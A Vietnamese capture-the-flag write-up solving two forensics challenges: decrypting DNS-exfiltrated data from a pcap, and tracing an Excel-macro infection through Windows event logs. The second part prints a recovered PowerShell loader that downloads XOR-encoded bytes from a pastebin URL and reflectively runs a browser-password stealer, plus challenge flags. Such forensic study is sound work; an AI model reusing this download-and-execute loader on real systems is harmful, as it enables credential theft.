# DNS-Exfiltration

ta thấy ở đây có 2 file 
![image](https://hackmd.io/_uploads/rkIdS_70xx.png)

đọc file pcap thì thấy chỉ có các gói DNS 

=> khả năng attacker sẽ lấy data thông qua gói DNS này 
![image](https://hackmd.io/_uploads/S1OkLOmAxx.png)

sử dụng filter frame.len > 100 thì sẽ thấy có các đoạn như này, khả năng nó sẽ là flag

khi mình đọc trong access.log và error.log thử tìm từ flag 

![image](https://hackmd.io/_uploads/HkbqIdQ0el.png)


ở đây sau khi dò thêm thì mình thấy có đoạn ip nghi ngờ là **192.168.13.37** 
từ đó dò bên file còn lại thì thấy tiếp có dòng này 

![image](https://hackmd.io/_uploads/Sk11vOXCeg.png)


đoạn này sẽ lấy biến 

**APP_SECRET=F0r3ns1c-2025-CSCV**
rồi lấy **SHA-256**
 
từ đó trích xuất ra key và iv 

**AES_KEY=H[0..15]; AES_IV=H[16..31]**

từ đây ta chỉ cần lấy DNS của các gói tin trong file PCAP rồi viết code mã hóa thôi

```
import hashlib
from Crypto.Cipher import AES
from binascii import unhexlify

# Step 1: Combine all ciphertext lines (remove spaces/newlines)
hex_data = """

6837abc6655c12c454abe0ca85a596e98473172829581235dd
95380b06bf6dd06b89118b0003ea044700a5f2c4c106c3
""".replace("\n", "").replace(" ", "")

# Step 2: Convert from hex to bytes
ciphertext = unhexlify(hex_data)

# Step 3: Derive AES key and IV
app_secret = b"F0r3ns1c-2025-CSCV"
h = hashlib.sha256(app_secret).digest()
key = h[:16]
iv = h[16:]

# Step 4: Decrypt
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(ciphertext)

# Step 5: Remove padding and decode
try:
    pad_len = plaintext[-1]
    plaintext = plaintext[:-pad_len]
except:
    pass

print(plaintext.decode(errors='ignore'))

#CSCV2025{DnS_Exf1ltr4ti0nnnnnnnnnnNN!!}
```

FLAG: **CSCV2025{DnS_Exf1ltr4ti0nnnnnnnnnnNN!!}**


# NostalgiaS

ở bài này đề bài yêu cầu chúng ta phân tích 1 file ổ đĩa AD1

dùng ftk để phân tích thử vào đường dẫn thì 

> C:\\\User\kadoyat\Document

có các file xlsm thường đây là file excel macro thì ở đây nó sẽ ẩn 1 macro để giấu code

ở bài này cũng có như khi phân tích thì chỉ thấy các hàm thực thi bình thường không đáng ngờ 

* theo kinh nghiệm làm cái bài về forensic thì độc đề bài ta thấy người dùng bị exfiltrate data

* nên mình nghĩ ngay tới việc malware sẽ thực thi trong đây

## phân tích source

* ở đoạn này sẽ có nhiều cách làm theo từng kinh nghiệm của từng người

* mình sẽ đi dò ở trong event log, vì tìm trong các thư mục còn lại cũng không thấy gì 

![image](https://hackmd.io/_uploads/rJJurpvAxx.png)


tìm trong Windows/System32/winevt/logs

file này nó lưu trữ các đoạn code bị remote và thực thi bởi powershell


![image](https://hackmd.io/_uploads/H1PWI6PCgl.png)


thấy ngay đoạn malicious code

```
$AssemblyUrl = "https://pastebin.com/raw/90qeYSHA"
$XorKey = 0x24
$TypeName = "StealerJanai.core.RiderKick"
$MethodName = "Run"

try {
    $WebClient = New-Object System.Net.WebClient
    $encodedContent = $WebClient.DownloadString($AssemblyUrl)
    $WebClient.Dispose()
    
    $hexValues = $encodedContent.Trim() -split ',' | Where-Object { $_ -match '^0x[0-9A-Fa-f]+$' }
    
    $encodedBytes = New-Object byte[] $hexValues.Length
    for ($i = 0; $i -lt $hexValues.Length; $i++) {
        $encodedBytes[$i] = [Convert]::ToByte($hexValues[$i].Trim(), 16)
    }
    
    $originalBytes = New-Object byte[] $encodedBytes.Length
    for ($i = 0; $i -lt $encodedBytes.Length; $i++) {
        $originalBytes[$i] = $encodedBytes[$i] -bxor $XorKey
    }
    
    $assembly = [System.Reflection.Assembly]::Load($originalBytes)
    
    if ($TypeName -ne "" -and $MethodName -ne "") {
        $targetType = $assembly.GetType($TypeName)
        $methodInfo = $targetType.GetMethod($MethodName, [System.Reflection.BindingFlags]::Static -bor [System.Reflection.BindingFlags]::Public)
        $methodInfo.Invoke($null, $null)
    }
    
} catch {
    exit 1
}

```
* mở link pastebin thì có các đoạn hex cách nhau bằng dấu ","

![image](https://hackmd.io/_uploads/SJl_ITDAgx.png)



* code này tải data từ link pastebin về

* rồi lấy các hex đó Xor với key: **0x24**


viết code python đảo ngược lại rồi ghép thành 1 file 


phân tích nó bằng DIE

![image](https://hackmd.io/_uploads/rJnPP6wClg.png)


đây là file viết bằng C# 

![image](https://hackmd.io/_uploads/H14Fwpw0xe.png)

![image](https://hackmd.io/_uploads/HysjPaPRxg.png)

* vào hàm chính phân tích và nhìn các hàm thì đây là malware 

* nó lấy các thông tin máy tính cùng với Password trong các trình duyệt WEB 

## tìm flag 

* sau khi biết được chương trình này làm gì thì mình tiến hành tìm flag 

* có 2 hướng

* 1) là flag sẽ được lưu trong mật khẩu của người dùng thông qua các trình duyệt web
* 2) là flag sẽ nằm trong chương trình này 


* ban đầu mình tìm theo hướng 1 và bị kẹt ở chỗ lấy masterkey để dump được pass
* nên mình sẽ nhảy qua hướng 2 để làm 
* theo phân tích 1 lúc thì thấy ở đây có hàm ![image](https://hackmd.io/_uploads/ry8YO6v0ee.png)

khá khả nghi

![image](https://hackmd.io/_uploads/rJhqdaP0xe.png)


* nhìn vào source thì cũng đủ để biết flag có thể nằm đây

```
private string DecodeMagicToString(string input)
		{
			string text;
			try
			{
				if (string.IsNullOrEmpty(input))
				{
					text = string.Empty;
				}
				else
				{
					List<byte> list = new List<byte>();
					foreach (char c in input)
					{
						int num = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".IndexOf(c);
						if (num < 0)
						{
							return "Invalid character";
						}
						int j = num;
						for (int k = list.Count - 1; k >= 0; k--)
						{
							int num2 = (int)(list[k] * 62) + j;
							list[k] = (byte)(num2 % 256);
							j = num2 / 256;
						}
						while (j > 0)
						{
							list.Insert(0, (byte)(j % 256));
							j /= 256;
						}
					}
					int num3 = 0;
					while (num3 < list.Count && list[num3] == 0)
					{
						num3++;
					}
					if (num3 >= list.Count)
					{
						text = string.Empty;
					}
					else
					{
						byte[] array = new byte[list.Count - num3];
						for (int l = 0; l < array.Length; l++)
						{
							array[l] = list[num3 + l];
						}
						text = Encoding.ASCII.GetString(array);
					}
				}
			}
			catch (Exception ex)
			{
				text = "Decode error: " + ex.Message;
			}
			return text;
		}
```

* ta thấy ở đây có hàm DecodeToMagic

* đơn giản nó chỉ là code mã hóa base62

* từ đây giải mã 2 đoạn input trên thì có

**CSCV2025{your_computer_
has_be3n_kicked_by**


* ta chú ý đoạn 
> string text3 = string.Concat(new string[] { text, machineName, "_", text2, registryValue, "}" });

ta sẽ cần tìm thêm tên máy tính và registryValue ở **"SOFTWARE\\hensh1n"**

* chỉ cần vào ntuser.dat để xem registryValue và SYSTEM để xem machineName

> trong đường dẫn SYSTEM\ControlSet001\Control\ComputerName
![image](https://hackmd.io/_uploads/rkAoiaDAeg.png)

> trong NTUSER.dat\Software\hensh1n

![image](https://hackmd.io/_uploads/SycS3TwCle.png)

=> flag **CSCV2025{your_computer_DESKTOP-47ICHL6_has_be3n_kicked_byHxrYJgdu}**
